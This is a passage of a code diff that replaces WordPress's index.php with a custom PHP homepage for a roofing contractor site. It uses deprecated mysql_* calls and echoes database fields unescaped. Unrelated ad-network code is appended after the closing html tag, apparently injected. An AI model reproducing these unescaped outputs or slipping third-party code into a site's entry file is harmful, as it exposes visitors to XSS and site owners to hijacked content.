+$query_Services3 = "SELECT whatwedo_wdo.name_wdo, whatwedo_wdo.colnro_wdo FROM whatwedo_wdo WHERE whatwedo_wdo.colnro_wdo=3 ORDER BY whatwedo_wdo.order_wdo";
+$Services3 = mysql_query($query_Services3, $rtconn) or die(mysql_error());
+$row_Services3 = mysql_fetch_assoc($Services3);
+$totalRows_Services3 = mysql_num_rows($Services3);
+
+mysql_select_db($database_rtconn, $rtconn);
+$query_Services4 = "SELECT whatwedo_wdo.name_wdo, whatwedo_wdo.colnro_wdo FROM whatwedo_wdo WHERE whatwedo_wdo.colnro_wdo=4 ORDER BY whatwedo_wdo.order_wdo";
+$Services4 = mysql_query($query_Services4, $rtconn) or die(mysql_error());
+$row_Services4 = mysql_fetch_assoc($Services4);
+$totalRows_Services4 = mysql_num_rows($Services4);
+
+$colname_Emergency = "-1";
+if (isset($_GET["loc"])) {
+  $colname_Emergency = (get_magic_quotes_gpc()) ? $_GET["loc"] : addslashes($_GET["loc"]);
+}
+mysql_select_db($database_rtconn, $rtconn);
+$query_Emergency = sprintf("SELECT * FROM emergency_ecy WHERE emergency_ecy.idloc_ecy=%s", GetSQLValueString($colname_Emergency, "int"));
+$Emergency = mysql_query($query_Emergency, $rtconn) or die(mysql_error());
+$row_Emergency = mysql_fetch_assoc($Emergency);
+$totalRows_Emergency = mysql_num_rows($Emergency);
+?><!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="<?php echo $row_Page['description_pag']; ?>">
+	<meta name="keywords" content="<?php echo $row_Page['keywords_pag']; ?>">
+    <meta name="author" content="RoofToday.com">
+	<link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
+	<link rel="manifest" href="/favicons/site.webmanifest">
+	<link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#5bbad5">
+	<link rel="shortcut icon" href="/favicons/favicon.ico">
+	<meta name="msapplication-TileColor" content="#2d89ef">
+	<meta name="msapplication-config" content="/favicons/browserconfig.xml">
+	<meta name="theme-color" content="#ffffff">
+	
+	<meta property="og:title" content="<?php echo $row_Page['title_pag']; ?>">
+	<meta property="og:site_name" content="RoofToday.com">
+	<meta property="og:type" content="website">
+	<meta property="og:description" content="<?php echo $row_Page['description_pag']; ?>">
+	<meta property="og:image" content="https://www.rooftoday.com/images/roof-today.png">
+	<meta property="og:url" content="https://www.rooftoday.com/">
+	<meta property="og:image:alt" content="<?php echo $row_Page['header_pag']; ?>">
+	
+    <title><?php echo $row_Page['title_pag']; ?></title>
+	<script src="https://kit.fontawesome.com/0e27bfd207.js" crossorigin="anonymous"></script>
+    <link rel="canonical" href="https://www.rooftoday.com/">
+    <!-- Bootstrap core CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css">
+    <!-- Custom styles for this template -->
+	<link rel="stylesheet" type="text/css" href="slick/slick.css"/>
+	<!-- Add the new slick-theme.css if you want the default styling-->
+	<link rel="stylesheet" type="text/css" href="slick/slick-theme.css"/>
+    <link href="css/master.css" rel="stylesheet">
+	<script src="js/jquery.min.js"></script>
+	<script src="js/bootstrap.bundle.min.js"></script>
+	<script type="text/javascript" src="slick/slick.min.js"></script>
+	 <script type="text/javascript">
+    $(document).ready(function(){
+     $('.listlocation').slick({
+  dots: false,
+  arrows: false,
+  autoplay: true,
+  infinite: true,
+  speed: 300,
+  slidesToShow: 5,
+  slidesToScroll: 1,
+  responsive: [
+    {
+      breakpoint: 1280,
+      settings: {
+        slidesToShow: 3,
+        slidesToScroll: 1,
+        infinite: true,
+        dots: false
+      }
+    },
+    {
+      breakpoint: 768,
+      settings: {
+        slidesToShow: 2,
+        slidesToScroll: 1
+      }
+    },
+    {
+      breakpoint: 480,
+      settings: {
+	  	speed: 100,
+        slidesToShow: 2,
+        slidesToScroll: 1
+      }
+    }
+    // You can unslick at a given breakpoint now by adding:
+    // settings: "unslick"
+    // instead of a settings object
+  ]
+});
+    });
+  </script>
+<script>
+$(document).ready(function(){
+// Select all links with hashes
+$('a[href*="#"]')
+  // Remove links that don't actually link to anything
+  .not('[href="#"]')
+  .not('[href="#0"]')
+  .click(function(event) {
+    // On-page links
+    if (
+      location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '') 
+      && 
+      location.hostname == this.hostname
+    ) {
+      // Figure out element to scroll to
+      var target = $(this.hash);
+      target = target.length ? target : $('[name=' + this.hash.slice(1) + ']');
+      // Does a scroll target exist?
+      if (target.length) {
+        // Only prevent default if animation is actually gonna happen
+        event.preventDefault();
+        $('html, body').animate({
+          scrollTop: target.offset().top
+        }, 1000, function() {
+          // Callback after animation
+          // Must change focus!
+          var $target = $(target);
+          $target.focus();
+          if ($target.is(":focus")) { // Checking if the target was focused
+            return false;
+          } else {
+            $target.attr('tabindex','-1'); // Adding tabindex for elements not focusable
+            $target.focus(); // Set focus again
+          };
+        });
+      }
+    }
+  });
+});
+</script>
+<style>
+.banner-bg {
+    background-image: url('images/banners/<?php echo $row_Page['pagebanner_pag']; ?>');
+    background-attachment: scroll;
+    background-position: center;
+    background-repeat: no-repeat;
+    background-size: cover;
+    padding: 1rem;
+}
+</style>
+</head>
+
+<body>
+<section class="sectop">
+	<div class="container">
+		<div class="row">
+			<div class="col-12 col-sm-7 col-md-8 text-center text-sm-left"><i class="far fa-clock text-danger"></i> 24/7 Emergency Roof Repairs</div>
+			<div class="col-12 col-sm-5 col-md-4 text-center text-sm-right">
+			<ul class="list-inline mb-0">
+			  	<?php do { ?>
+			  	  <li class="list-inline-item"><a href="<?php echo $row_Socialtop['netlink_snk']; ?>" class="text-dark"><i class="<?php echo $row_Socialtop['iconcode_snk']; ?>"></i></a></li>
+			  	  <?php } while ($row_Socialtop = mysql_fetch_assoc($Socialtop)); ?></ul>
+			</div>
+		</div>
+	</div>
+</section>
+    <nav class="navbar navbar-expand-lg navbar-light bg-light sticky-top py-3">
+	<div class="container">
+  <a class="navbar-brand" href="<?php echo $host; ?>"><img src="<?php echo $host; ?>images/roof-today.png" alt="<?php echo $row_Page['title_pag']; ?>" class="img-fluid"></a>
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarText" aria-controls="navbarText" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+  <div class="collapse navbar-collapse" id="navbarText">
+    <ul class="navbar-nav ml-auto mr-auto">
+      <li class="nav-item">
+        <a class="nav-link" href="#section1">ROOFING SERVICES</a>
+      </li>
+      <li class="nav-item dropdown">
+        <a class="nav-link dropdown-toggle" href="#" id="locDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">CHOOSE YOUR LOCATION</a>
+		<div class="dropdown-menu" aria-labelledby="locDropdown">
+          <?php do { ?>
+            <a class="dropdown-item" href="<?php echo $host. strtolower($row_Locationtop['locstate_loc']). '/'. seoUrl($row_Locationtop['loccounty_loc']). '/'. seoUrl($row_Locationtop['loccity_loc']);?>"><?php echo $row_Locationtop['menulink_loc']; ?></a>
+            <?php } while ($row_Locationtop = mysql_fetch_assoc($Locationtop)); ?>
+        </div>
+      </li>
+	  <li class="my-2 pl-4 pr-3">
+        <a class="btn btn-success" href="<?php echo $host; ?>roof-services/free-estimate">FREE ESTIMATE</a>
+      </li>
+    </ul>
+    <span class="navbar-text">
+      <div class="callwrapper my-0">
+	  	<div class="calltext">CALL / TEXT</div>
+		<div class="callphone"><?php echo $row_Phone['phone_phe']; ?></div>
+	  </div>
+    </span>
+  </div>
+  </div>
+</nav>
+<section class="d-block">
+<div id="rooftopCarousel" class="carousel slide carousel-fade" data-ride="carousel">
+<div class="carousel-caption d-block">
+	<h1 class="banner-header"><?php echo $row_Sliders['title_ban']; ?></h1>
+	<h3 class="banner-subheader"><?php echo $row_Sliders['subheader_ban']; ?></h3>
+	<div class="top-search">
+	<form action="<?php echo $host. 'roof-services/free-estimate'; ?>" method="post" name="frmaddress" id="frmaddress">
+	<div class="panel panel-default">
+        <div class="panel-body frmsch">
+			<div class="form-search">
+				<div class="row">
+					<div class="col-8 col-sm-7 col-md-8 col-lg-9">
+						<div class="form-group-custom">
+							<input type="text" name="autocomplete" id="autocomplete" class="form-control" placeholder="Start with your address." onFocus="geolocate()" required>
+						</div>
+					</div>
+				<div class="col-4 col-sm-5 col-md-4 col-lg-3">
+				<div class="button-wrapper d-none d-sm-block"><button type="submit" name="addressbtn" id="addressbtn" class="btn btn-success btn-block btn-form">GET YOUR QUOTE</button></div>
+				<div class="button-wrapper d-block d-sm-none"><button type="submit" name="addressbtn" id="addressbtn" class="btn btn-success btn-block btn-form">GO!</button></div>
+				</div>
+				</div>
+			</div>
+		</div>
+    </div>
+	<div id="address">
+	<input type="hidden" name="street_number" id="street_number">
+	<input type="hidden" name="route" id="route">
+	<input type="hidden"  name="locality" id="locality">
+	<input type="hidden" name="administrative_area_level_1" id="administrative_area_level_1">
+	<input type="hidden" name="postal_code" id="postal_code">
+	<input type="hidden" name="country" id="country">
+	</div>
+	</form>
+	</div>
+	</div>
+  <div class="carousel-inner">
+    <?php do { ?>
+      <div class="carousel-item<?php if($row_Sliders['order_ban']==1): echo ' active'; else: echo''; endif; ?>"> <img src="<?php echo $host; ?>images/sliders/<?php echo $row_Sliders['banner_ban']; ?>" alt="First slide" width="1920" height="1032" class="img-fluid"> </div>
+      <?php } while ($row_Sliders = mysql_fetch_assoc($Sliders)); ?></div>
+</div>
+</section>
+<section class="bg-primary">
+<div class="container">
+	<div class="row">
+		<div class="p-2 text-white text-center col-12"><strong>OUR ROOFING SERVICE LOCATIONS</strong></div>
+	</div>
+</div>
+</section>
+<section class="loclist">
+  <div class="listlocation">
+      <?php do { ?>
+      <div>
+        <div class="float-left mr-3 text-green iconwrapper"><i class="fas fa-map-marker-alt"></i></div>
+        <div class="float-left">
+          <a class="text-dark" href="<?php echo $host. strtolower($row_Locations['locstate_loc']). '/'. seoUrl($row_Locations['loccounty_loc']). '/'. seoUrl($row_Locations['loccity_loc']);?>"><h5 class="my-0"><strong><?php echo $row_Locations['loccity_loc']; ?></strong></h5></a>
+          <p my-0 p-0>All of <?php echo $row_Locations['loccounty_loc']; ?> County</p></div>
+      </div>
+        <?php } while ($row_Locations = mysql_fetch_assoc($Locations)); ?></div>
+</section>
+	<section class="my-5">
+		<div class="container"><?php echo $row_Locations['loccity_loc']; ?>
+			<div class="row">
+				<div class="col-12 col-sm-12 col-md-12 col-lg-7 col-xl-6">
+				<h2><?php echo $row_Page['header_pag']; ?></h2>
+				<h3><?php echo $row_Page['subheader_pag']; ?></h3>
+					<?php echo $row_Page['body_pag']; ?>
+				</div>
+				<div class="col-12 col-sm-12 col-md-12 col-lg-5 col-xl-6">
+					<img src="<?php echo $host; ?>images/pages/<?php echo $row_Page['pagepicture_pag']; ?>" alt="<?php echo $row_Page['title_pag']; ?>" class="img-fluid">
+				</div>
+			</div>
+		</div>
+	</section>
+	<?php 
+// Show IF Conditional region1 
+if (@$row_Page['showlmore_pag'] == 1) {
 ?>
+      <section class="container my-5">
+        <div class="row d-none d-md-block">
+          <div class="col-12 alert247">
+            <div class="alert-text"><?php echo $row_Emergency['message_ecy']; ?></div>
+            <div class="alert-phone text-center">
+              <div class="alertemmergency">
+                <div class="alertclock"><i class="<?php echo $row_Emergency['icon_ecy']; ?>"></i></div>
+                <div class="alert24hours"><?php echo $row_Emergency['header_ecy']; ?></div>
+                <div class="arlertecy"><?php echo $row_Emergency['emergency_ecy']; ?></div>
+                <div class="alertphone"><?php echo $row_Phone247['phone_phe']; ?></div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="row d-block d-md-none">
+          <div class="col-12 bg-green">
+            <div class="alert-text"><?php echo $row_Emergency['message_ecy']; ?></div>
+          </div>
+          <div class="col-12 bg-blue">
+            <div class="alert-phone text-center">
+              <div class="alertemmergency">
+                <div class="alertclock"><i class="<?php echo $row_Emergency['icon_ecy']; ?>"></i></div>
+                <div class="alert24hours"><?php echo $row_Emergency['header_ecy']; ?></div>
+                <div class="arlertecy"><?php echo $row_Emergency['emergency_ecy']; ?></div>
+                <div class="alertphone"><?php echo $row_Phone247['phone_phe']; ?></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <?php } 
+// endif Conditional region1
+?><?php 
+// Show IF Conditional region2 
+if (@$row_Page['showtypes_pag'] == 1) {
+?>
+      <section class="my-5">
+        <div class="container">
+          <div class="row">
+            <div class="col-12 text-center"><span class="text-lightsm">WE SPECIALIZE IN</span></div>
+            <div class="col-12 text-center mb-3">
+              <h3 class="headline">ALL ROOF TYPES & DESIGNS</h3>
+            </div>
+          </div>
+          <div class="row">
+            <?php do { ?>
+              <div class="col-12 col-sm-6 col-md-6 col-lg-3 mb-4">
+                <div class="card"> <img src="<?php echo $host. 'images/types/'. $row_Types['thumbnail_res']; ?>" alt="<?php echo $row_Types['rooftype_res']; ?>" class="card-img-top">
+                    <div class="card-body">
+                      <h5 class="card-title"><?php echo $row_Types['rooftype_res']; ?></h5>
+                      <p class="card-text"><?php echo $row_Types['shortdesc_res']; ?></p>
+                    </div>
+                </div>
+              </div>
+              <?php } while ($row_Types = mysql_fetch_assoc($Types)); ?>
+          </div>
+        </div>
+      </section>
+      <?php } 
+// endif Conditional region2
+?>
+	  <?php 
+// Show IF Conditional region3 
+if (@$row_Page['showrepairs_pag'] == 1) {
+?>
+        <section class="my-5">
+          <div class="container">
+            <div class="row mb-3">
+			  <div class="col-sm-12 col-md-12 text-center"><a href="<?php echo $host; ?>roof-services/free-estimate" class="btn btn-warning btn-lg mb-4">GET A QUOTE</a></div>
+              <div class="col-sm-12 col-md-12 text-center"><span class="text-lightsm">WHAT WE DO</span></div>
+              <div class="col-sm-12 col-md-12 text-center">
+                <h3 class="headline">ROOFING SERVICES & REPAIRS</h3>
+              </div>
+            </div>
+            <div class="row" id="section1">
+              <div class="col-sm-6 col-md-6 col-lg-3">
+                <ul class="list-unstyled">
+                  <?php do { ?>
+                    <li><i class="far fa-check-square text-muted"></i> <?php echo $row_Services1['name_wdo']; ?></li>
+                    <?php } while ($row_Services1 = mysql_fetch_assoc($Services1)); ?>
+                </ul>
+              </div>
+              <div class="col-sm-6 col-md-6 col-lg-3">
+                <ul class="list-unstyled">
+                  <?php do { ?>
+                    <li><i class="far fa-check-square text-muted"></i> <?php echo $row_Services2['name_wdo']; ?></li>
+                    <?php } while ($row_Services2 = mysql_fetch_assoc($Services2)); ?>
+                </ul>
+              </div>
+              <div class="col-sm-6 col-md-6 col-lg-3">
+                <ul class="list-unstyled">
+                  <?php do { ?>
+                    <li><i class="far fa-check-square text-muted"></i> <?php echo $row_Services3['name_wdo']; ?></li>
+                    <?php } while ($row_Services3 = mysql_fetch_assoc($Services3)); ?>
+                </ul>
+              </div>
+              <div class="col-sm-6 col-md-6 col-lg-3">
+                <ul class="list-unstyled">
+                  <?php do { ?>
+                    <li><i class="far fa-check-square text-muted"></i> <?php echo $row_Services4['name_wdo']; ?></li>
+                    <?php } while ($row_Services4 = mysql_fetch_assoc($Services4)); ?>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </section>
+        <?php } 
+// endif Conditional region3
+?>
+    <footer class="mt-5 bg-dark text-white">
+	<div class="container">
+      <div class="row">
+        <div class="col-12 col-sm-12 col-md-4 text-center text-md-left">
+			<img src="<?php echo $host; ?>images/roof-today.png" alt="<?php echo $row_Page['title_pag']; ?>" class="img-fluid mt-3">
+			<h5 class="mt-3"><strong>Our Locations:</strong></h5>
+			<ul class="list-unstyled small">
+            <?php do { ?>
+            <li class="address-footer"><?php echo $row_Addresses['location_loc']; ?></li>
+            <?php } while ($row_Addresses = mysql_fetch_assoc($Addresses)); ?>
+		  </ul>
+        </div>
+        <div class="col-12 col-sm-6 col-md-4">
+			<div class="row">
+				<div class="col-12">
+					<div class="footeremmergency text-center text-md-right">
+						<div class="footerclock"><i class="<?php echo $row_Emmergencyft['icon_ecy']; ?>"></i></div>
+						<div class="footer24hours"><?php echo $row_Emmergencyft['header_ecy']; ?></div>
+						<div class="footerecy"><?php echo $row_Emmergencyft['emergency_ecy']; ?></div>
+						<div class="footerphone"><?php echo $row_Phone247['phone_phe']; ?></div>
+					</div>
+				</div>
+			</div>
+        </div>
+        <div class="col-12 col-sm-6 col-md-4 text-center text-md-right">
+			<div class="footerrevolution">
+			<img src="images/roof-revolution.png" alt="" class="img-fluid">
+			</div>
+        </div>
+		<div class="col-12">
+		<div class="row my-3">
+			<div class="col-12 col-sm-7 col-md-6 text-center text-md-left copyright-wrapper">Copyright &copy; <?php echo date("Y"); ?> RoofToday.com</div>
+			<div class="col-12 col-sm-5 col-md-6 text-center text-md-right">
+			  <ul class="list-inline mb-0">
+			  	<?php do { ?>
+			  	  <li class="list-inline-item mb-0"><a href="<?php echo $row_Socialft['netlink_snk']; ?>" class="text-white"><i class="<?php echo $row_Socialft['iconcode_snk']; ?> fa-2x"></i></a></li>
+			  	  <?php } while ($row_Socialft = mysql_fetch_assoc($Socialft)); ?></ul>
+			</div>
+		</div>
+		</div>
+      </div>
+	</div>
+    </footer>
+<?php require_once('includes/autocomplete.php'); ?>
+</body>
+</html>
+<head>
+	<script async custom-element="amp-ad" src="https://cdn.ampproject.org/v0/amp-ad-0.1.js"></script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5889948157508068"
+     crossorigin="anonymous"></script>
+</head>
+<body>
+	<amp-ad width="100vw" height="320"
+     type="adsense"
+     data-ad-client="ca-pub-5889948157508068"
+     data-ad-slot="6933244247"
+     data-auto-format="rspv"
+     data-full-width="">
+  <div overflow=""></div>
+</amp-ad>
+	<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5889948157508068"
+     crossorigin="anonymous"></script>
+<!-- Berkode -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-5889948157508068"
+     data-ad-slot="6933244247"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+</body>
 <?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
+mysql_free_result($Page);
 
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
+mysql_free_result($Addresses);
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+mysql_free_result($Emmergencyft);
+
+mysql_free_result($Socialtop);
+
+mysql_free_result($Socialft);
+
+mysql_free_result($Phone);
+
+mysql_free_result($Phone247);
+
+mysql_free_result($Sliders);
+
+mysql_free_result($Types);
+
+mysql_free_result($Services1);
+
+mysql_free_result($Services2);
+
+mysql_free_result($Services3);
+
+mysql_free_result($Services4);
+
+mysql_free_result($Emergency);
+
+mysql_free_result($Locationtop);
+
+mysql_free_result($Locations);
+
+mysql_free_result($Emmergencypg);
+?>
